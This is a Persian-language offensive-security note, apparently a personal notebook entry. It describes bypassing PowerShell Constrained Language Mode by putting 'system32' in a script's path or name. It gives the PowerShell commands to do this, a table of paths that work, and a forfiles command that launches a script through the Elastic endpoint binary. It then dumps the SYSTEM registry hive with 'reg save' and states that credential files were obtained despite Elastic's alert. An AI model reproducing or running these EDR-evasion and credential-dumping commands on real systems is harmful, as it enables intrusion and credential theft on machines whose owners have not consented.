
در سیستم عامل ویندوز یک مکنیزم امنیتی وجود دارد به اسم Constrained Language 
این مکانیزم معمولا توسط AV/EDR یا Applocker و موارد این چنینی فعال میشود و باعث میشود که یک قفل موقع اجرای دستورات حساسی که از طریق powershell اجرا میشود موقع اجرا بلاک شود  

حالا نکته  داستان کجاس مایکروسافت داخل موتور PowerShell یه لیست سفید (whitelist) خیلی قدیمی و مخفی گذاشته که می‌گه «اگر اسکریپت PowerShell از مسیری اجرا بشه که تو اسمش رشتهٔ system32 باشه  بهش اعتماد کن و ConstrainedLanguage رو خاموش کن.» و با سطج FullLnaguage اجرا شو

چون خیلی از اسکریپت‌های قانونی سیستمی واقعاً از  
C:\Windows\System32\WindowsPowerShell\v1.0\  
یا  
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\  
اجرا می‌شن، مایکروسافت این استثنا رو گذاشته.هکرها (و ما) فقط از همین باگ/فیچر سوءاستفاده می‌کنیم!

فقط یکی از اینا کافیه (حساسیت به حروف بزرگ و کوچک نداره):

|مثال مسیر/اسم فایل|نتیجه|
|---|---|
|C:\temp\system32\evil.ps1|FullLanguage|
|C:\users\public\system32-hack.ps1|FullLanguage|
|C:\temp\System32Fake\payload.ps1|FullLanguage|
|C:\temp\abcSYSTEM32def\script.ps1|FullLanguage|
|C:\temp\myfolder\system32.exe (حتی exe)|FullLanguage (اگر ازش ps1 اجرا کنی)|
|C:\temp\notsystem33\script.ps1|ConstrainedLanguage (کار نمی‌کنه)|



```powershell

$ExecutionContext.SessionState.LanguageMode
echo '$ExecutionContext.SessionState.LanguageMode' > C:\temp\test.ps1
C:\temp\test.ps1

Rename-Item C:\temp\test.ps1 C:\temp\system32.ps1

Move-Item C:\temp\test.ps1 C:\temp\system32\test.ps1
C:\temp\system32.ps1
```

در این اسکریپت ما میایم و همین مورد میریزیم داخل یک فایل .ps1 به اسم test وقتی که اجراش کنیم میبینمیم که Constrained Language هستیم 

![[Pasted image 20251121173419.png]]

اما میایم حالا اسم فایل رو به system32 تغییر میدیم و دوباره با همون پسوند ps1 میزاریمش 

![[Pasted image 20251121173527.png]]

همونطور که میبینید ما الان با سطح  fulllanguage میتونیم بیایم و اسکریپت هایی رو که میخواهیم اجرا کنیم و راهکار های امنیتی از جمله Applocker رو بایپس کنیم یا حتی فایل مون رو بندازیم داخل system32 

```powershell
$ExecutionContext.SessionState.LanguageMode
```

با استفاده از این دستور ما میتونیم بیایم و وضعیت LanguageMode مون رو بگیریم و بببینیم که Constrained Language یا FullLnaguage  



---


![[Pasted image 20251121182832.png]]


![[Pasted image 20251121182932.png]]

همونطور که میبینید Elastic الرتی که میندازه از نوع Prevent هستش اما ما به خوسته خودمون رسیدیم 

![[Pasted image 20251121183100.png]]

فایل هایی که شامل Credential های سیستم هستش رو گرفتیم 

![[Pasted image 20251121183218.png]]




یکی دیگر از روش های Bypass کردن Elastic  

```shell
forfiles /p "C:\Program Files\Elastic\Endpoint" /m elastic-endpoint.exe /c "powershell -command C:\Temp\system32.ps1"
```

content system32.ps1

```powershell
$command = "reg save hklm\system  C:\Temp\sam.save"
iex($command)
```


decompres 

system32.ps1